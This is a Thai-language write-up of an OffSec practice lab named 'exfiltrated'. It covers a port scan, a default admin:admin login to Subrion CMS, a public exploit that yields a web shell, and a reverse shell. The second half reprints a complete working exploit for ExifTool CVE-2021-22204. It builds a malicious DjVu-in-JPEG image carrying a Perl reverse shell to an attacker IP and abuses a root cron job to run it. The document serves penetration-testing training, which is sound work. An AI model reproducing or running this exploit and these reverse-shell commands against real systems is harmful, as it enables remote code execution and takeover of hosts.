# Recon 
## TCP Scan 
```bash
sudo ../tools/scan.sh 192.168.248.163
[*] Running rustscan...
[*] Running nmap on ports: 22,80
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-06 23:43 EDT
Nmap scan report for 192.168.248.163
Host is up (0.033s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c1:99:4b:95:22:25:ed:0f:85:20:d3:63:b4:48:bb:cf (RSA)
|   256 0f:44:8b:ad:ad:95:b8:22:6a:f0:36:ac:19:d0:0e:f3 (ECDSA)
|_  256 32:e1:2a:6c:cc:7c:e6:3e:23:f4:80:8d:33:ce:9b:3a (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Did not follow redirect to http://exfiltrated.offsec/
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-robots.txt: 7 disallowed entries 
| /backup/ /cron/? /front/ /install/ /panel/ /tmp/ 
|_/updates/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.14 seconds
```

## TCP 80 
### Edit Host file 
![[Pasted image 20250707104516.png]]

![[Pasted image 20250707104703.png]]

# Login using admin 
ทดสอบ Login ด้วย admin:admin 

![[Pasted image 20250707122659.png]]

หากลองทดสอบกดไปที่ Profile จะเห็นมีรูปเกียร์อยู่ให้กดจะถูก Redirect ไปยังหน้า /panel

![[Pasted image 20250707131243.png]]

จากข้อมูลข้างต้นจะเห็นว่ามีการใช้งาน Subrion CMS version 4.2.1 อีกทั้งสามารถใช้ User admin เข้าสู่ระบบได้ 

![[Pasted image 20250707131414.png]]


# Web Exploit with payload

```bash
python3 49876.py -u http://exfiltrated.offsec/panel/ -l admin -p admin
python -c 'import pty;pty.spawn("/bin/bash")'
```

![[Pasted image 20250707131657.png]]

เนื่องจาก Shell ที่เราได้เป็น Web Shell ที่มีข้อจำกัดจึงดำเนินการทำ Reverse Shell กลับไปหา Attacker Machine 
![[Pasted image 20250707132627.png]]

upgrade shell using pty spawn
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

# Crontab 

![[Pasted image 20250707133647.png]]

```bash
cat /opt/image-exif.sh 
#! /bin/bash
#07/06/18 A BASH script to collect EXIF metadata 

echo -ne "\\n metadata directory cleaned! \\n\\n"


IMAGES='/var/www/html/subrion/uploads'

META='/opt/metadata'
FILE=`openssl rand -hex 5`
LOGFILE="$META/$FILE"

echo -ne "\\n Processing EXIF metadata now... \\n\\n"
ls $IMAGES | grep "jpg" | while read filename; 
do 
    exiftool "$IMAGES/$filename" >> $LOGFILE 
done

echo -ne "\\n\\n Processing is finished! \\n\\n\\n"
www-data@exfiltrated:/var/www/html/subrion/uploads$ 

#### 
www-data@exfiltrated:/var/www/html/subrion/uploads$ exiftool -ver
exiftool -ver
11.88

```

หากค้นหา Exploit จะเห็นว่า Exiftool อาจมีช่องโหว่ 
![[Pasted image 20250707135104.png]]

### Payload 

```python
#!/usr/bin/env python3
# Exploit Title: ExifTool 7.44-12.23 - Arbitrary Code Execution
# Date: 04/30/2022
# Exploit Author: UNICORD (NicPWNs & Dev-Yeoj)
# Vendor Homepage: https://exiftool.org/
# Software Link: https://github.com/exiftool/exiftool/archive/refs/tags/12.23.zip
# Version: 7.44-12.23
# Tested on: ExifTool 12.23 (Debian)
# CVE: CVE-2021-22204
# Source: https://github.com/UNICORDev/exploit-CVE-2021-22204
# Description: Improper neutralization of user data in the DjVu file format in ExifTool versions 7.44 and up allows arbitrary code execution when parsing the malicious image

# Imports
import base64
import os
import subprocess
import sys
import time

# Class for colors
class color:
    red = '\033[91m'
    gold = '\033[93m'
    blue = '\033[36m'
    green = '\033[92m'
    no = '\033[0m'

# Print UNICORD ASCII Art
def UNICORD_ASCII():
    print(rf"""
{color.red}        _ __,~~~{color.gold}/{color.red}_{color.no}        {color.blue}__  ___  _______________  ___  ___{color.no}
{color.red}    ,~~`( )_( )-\|       {color.blue}/ / / / |/ /  _/ ___/ __ \/ _ \/ _ \{color.no}
{color.red}        |/|  `--.       {color.blue}/ /_/ /    // // /__/ /_/ / , _/ // /{color.no}
{color.green}_V__v___{color.red}!{color.green}_{color.red}!{color.green}__{color.red}!{color.green}_____V____{color.blue}\____/_/|_/___/\___/\____/_/|_/____/{color.green}....{color.no}
    """)

# Print exploit help menu
def help():
    print(r"""UNICORD Exploit for CVE-2021-22204 (ExifTool) - Arbitrary Code Execution

Usage:
  python3 exploit-CVE-2021-22204.py -c <command>
  python3 exploit-CVE-2021-22204.py -s <local-IP> <local-port>
  python3 exploit-CVE-2021-22204.py -c <command> [-i <image.jpg>]
  python3 exploit-CVE-2021-22204.py -s <local-IP> <local-port> [-i <image.jpg>]
  python3 exploit-CVE-2021-22204.py -h

Options:
  -c    Custom command mode. Provide command to execute.
  -s    Reverse shell mode. Provide local IP and port.
  -i    Path to custom JPEG image. (Optional)
  -h    Show this help menu.
""")

def loading(spins):

    def spinning_cursor():
        while True:
            for cursor in '|/-\\':
                yield cursor

    spinner = spinning_cursor()
    for _ in range(spins):
        sys.stdout.write(next(spinner))
        sys.stdout.flush()
        time.sleep(0.1)
        sys.stdout.write('\b')

# Check for dependencies
def dependencies():

    deps = {'bzz':"sudo apt install djvulibre-bin",'djvumake':"sudo apt install djvulibre-bin",'exiftool':"sudo apt install exiftool"}
    missingDep = False

    for dep in deps:
        if subprocess.call(['which',dep],stdout=subprocess.DEVNULL,stderr=subprocess.STDOUT) == 1:
            print(f"{color.blue}ERRORED: {color.red}Missing dependency \"{dep}\". Try: \"{deps[dep]}\"{color.no}")
            missingDep = True

    if missingDep is True:
        exit()

# Run the exploit
def exploit(command):

    UNICORD_ASCII()

    # Create perl payload
    payload = "(metadata \"\c${"
    payload += command
    payload += "};\")"

    print(f"{color.blue}UNICORD: {color.red}Exploit for CVE-2021-22204 (ExifTool) - Arbitrary Code Execution{color.no}")
    print(f"{color.blue}PAYLOAD: {color.gold}" + payload + f"{color.no}")
    loading(15)

    # Check for dependencies
    dependencies()

    print(f"{color.blue}DEPENDS: {color.gold}Dependencies for exploit are met!{color.no}")

    loading(15)

    # Write payload to file
    payloadFile = open('payload','w')
    payloadFile.write(payload)
    payloadFile.close()

    print(f"{color.blue}PREPARE: {color.gold}Payload written to file!{color.no}")

    # Bzz compress file
    subprocess.run(['bzz', 'payload', 'payload.bzz'])

    print(f"{color.blue}PREPARE: {color.gold}Payload file compressed!{color.no}")

    # Run djvumake
    subprocess.run(['djvumake', 'exploit.djvu', "INFO=1,1", 'BGjp=/dev/null', 'ANTz=payload.bzz'])

    print(f"{color.blue}PREPARE: {color.gold}DjVu file created!{color.no}")

    # Process custom image file
    if '-i' in sys.argv:
        imagePath = sys.argv[sys.argv.index('-i') + 1]
        subprocess.run(['cp',f'{imagePath}','./image.jpg','-n'])

    else:
        # Smallest possible JPEG
        image = b"/9j/4AAQSkZJRgABAQEASABIAAD/2wBDAAMCAgICAgMCAgIDAwMDBAYEBAQEBAgGBgUGCQgKCgkICQkKDA8MCgsOCwkJDRENDg8QEBEQCgwSExIQEw8QEBD/yQALCAABAAEBAREA/8wABgAQEAX/2gAIAQEAAD8A0s8g/9k="

        # Write smallest possible JPEG image to file
        with open("image.jpg", "wb") as img:
            img.write(base64.decodebytes(image))

    print(f"{color.blue}PREPARE: {color.gold}JPEG image created/processed!{color.no}")

    # Write exiftool config to file
    config = (r"""
    %Image::ExifTool::UserDefined = (
    'Image::ExifTool::Exif::Main' => {
        0xc51b => {
            Name => 'HasselbladExif',
            Writable => 'string',
            WriteGroup => 'IFD0',
        },
    },
    );
    1; #end
    """)
    configFile = open('exiftool.config','w')
    configFile.write(config)
    configFile.close()

    print(f"{color.blue}PREPARE: {color.gold}Exiftool config written to file!{color.no}")

    loading(15)

    # Exiftool config for output image
    subprocess.run(['exiftool','-config','exiftool.config','-HasselbladExif<=exploit.djvu','image.jpg','-overwrite_original_in_place','-q'])

    print(f"{color.blue}EXPLOIT: {color.gold}Payload injected into image!{color.no}")

    # Delete leftover files
    os.remove("payload")
    os.remove("payload.bzz")
    os.remove("exploit.djvu")
    os.remove("exiftool.config")
    if os.path.exists("image.jpg_exiftool_tmp"):
        os.remove("image.jpg_exiftool_tmp")

    print(f"{color.blue}CLEANUP: {color.gold}Old file artifacts deleted!{color.no}")

    loading(15)

    # Print results
    print(f"{color.blue}SUCCESS: {color.green}Exploit image written to \"{color.gold}image.jpg{color.green}\"{color.no}\n")

    exit()

if __name__ == "__main__":

    args = ['-h','-c','-s','-i']

    if args[0] in sys.argv:
        help()

    elif args[1] in sys.argv and not args[2] in sys.argv:
        exec = sys.argv[sys.argv.index(args[1]) + 1]
        command = f"system(\'{exec}\')"
        exploit(command)

    elif args[2] in sys.argv and not args[1] in sys.argv:
        localIP = sys.argv[sys.argv.index(args[2]) + 1]
        localPort = sys.argv[sys.argv.index(args[2]) + 2]
        command = f"use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in({localPort},inet_aton('{localIP}')))){{open(STDIN,'>&S');open(STDOUT,'>&S');open(STDERR,'>&S');exec('/bin/sh -i');}};"
        exploit(command)

    else:
        help()
```

สร้าง Payload 
```bash
sudo python3 exploit.py -s 192.168.45.219 1234 
```

![[Pasted image 20250707135927.png]]

![[Pasted image 20250707152033.png]]

# PWN 